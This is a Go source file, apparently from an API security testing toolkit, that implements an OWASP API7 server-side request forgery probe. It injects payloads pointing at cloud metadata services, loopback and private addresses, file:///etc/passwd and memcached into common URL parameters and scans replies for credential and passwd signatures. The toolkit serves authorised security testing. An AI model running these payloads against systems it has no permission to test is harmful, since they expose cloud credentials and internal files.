// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2024 opensecstack contributors.

package api

// OWASP API7:2023 — Server Side Request Forgery (SSRF)
//
// Sends requests with URL parameters pointing at internal/metadata addresses to
// check whether the server makes outbound requests on the attacker's behalf.
//
// Safety guarantee: production blocklist check runs before any network I/O.

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// SSRFAttack simulates OWASP API7 — Server Side Request Forgery.
type SSRFAttack struct {
	client *http.Client
}

// NewSSRFAttack returns a ready SSRFAttack.
func NewSSRFAttack() *SSRFAttack {
	return &SSRFAttack{client: &http.Client{Timeout: 10 * time.Second}}
}

// ssrfPayloads lists internal/metadata addresses used as SSRF bait values.
var ssrfPayloads = []string{
	"http://169.254.169.254/latest/meta-data/",       // AWS IMDS
	"http://169.254.169.254/metadata/instance",        // Azure IMDS
	"http://metadata.google.internal/computeMetadata/v1/", // GCP
	"http://localhost/",
	"http://127.0.0.1/",
	"http://0.0.0.0/",
	"http://192.168.1.1/",
	"http://10.0.0.1/",
	"http://[::1]/",
	"file:///etc/passwd",
	"dict://localhost:11211/",
}

// Run tests each configured endpoint by injecting SSRF payloads into URL query
// parameters. Any 200 response with a non-trivial body is flagged.
//
// Recognised params keys:
//   - "endpoints"     []string   — paths with query param templates, e.g. ["/api/fetch?url={payload}"]
//   - "param_names"   []string   — query param names to inject (default: ["url","uri","redirect","endpoint","proxy","fetch","target","src","source","path"])
//   - "jwt"           string     — optional Bearer token
func (a *SSRFAttack) Run(ctx context.Context, targetURL string, params map[string]any) (*AttackResult, error) {
	if err := checkTarget(targetURL); err != nil {
		return nil, err
	}

	start := time.Now()
	result := &AttackResult{Technique: "SSRF"}

	endpoints := stringSliceParam(params, "endpoints", []string{
		"/api/fetch",
		"/api/proxy",
		"/api/webhook",
		"/api/download",
		"/api/import",
	})

	paramNames := stringSliceParam(params, "param_names", []string{
		"url", "uri", "redirect", "endpoint", "proxy",
		"fetch", "target", "src", "source", "path",
	})

	jwt, _ := params["jwt"].(string)
	base := strings.TrimRight(targetURL, "/")

	for _, ep := range endpoints {
		for _, pname := range paramNames {
			for _, payload := range ssrfPayloads {
				select {
				case <-ctx.Done():
					result.Duration = time.Since(start)
					return result, ctx.Err()
				default:
				}

				u, err := url.Parse(base + ep)
				if err != nil {
					continue
				}
				q := u.Query()
				q.Set(pname, payload)
				u.RawQuery = q.Encode()
				fullURL := u.String()

				req, err := http.NewRequestWithContext(ctx, http.MethodGet, fullURL, nil)
				if err != nil {
					continue
				}
				if jwt != "" {
					req.Header.Set("Authorization", "Bearer "+jwt)
				}

				resp, err := a.client.Do(req)
				if err != nil {
					continue
				}
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
				resp.Body.Close()

				if resp.StatusCode == http.StatusOK && len(body) > 0 {
					// Look for IMDS/internal service signatures in the body.
					bodyStr := string(body)
					if containsSSRFSignal(bodyStr) {
						result.Success = true
						result.Evidence = append(result.Evidence,
							fmt.Sprintf("SSRF[confirmed]: GET %s HTTP 200 — body contains internal-service data (snippet=%q)",
								fullURL, truncate(bodyStr, 200)))
					} else {
						result.Evidence = append(result.Evidence,
							fmt.Sprintf("SSRF[possible]: GET %s HTTP 200 — param %q accepted payload %q (body_len=%d)",
								fullURL, pname, payload, len(body)))
					}
				}
			}
		}
	}

	result.Duration = time.Since(start)
	return result, nil
}

// containsSSRFSignal checks whether a response body contains patterns typical
// of cloud metadata or internal service responses.
func containsSSRFSignal(body string) bool {
	signals := []string{
		"ami-id", "instance-id", "local-ipv4",   // AWS IMDS
		"computeMetadata", "serviceAccounts",      // GCP
		"azureProfile", "subscriptionId",          // Azure
		"root:x:", "/bin/bash",                    // /etc/passwd
		"VERSION", "STORED",                       // memcached
	}
	lower := strings.ToLower(body)
	for _, s := range signals {
		if strings.Contains(lower, strings.ToLower(s)) {
			return true
		}
	}
	return false
}
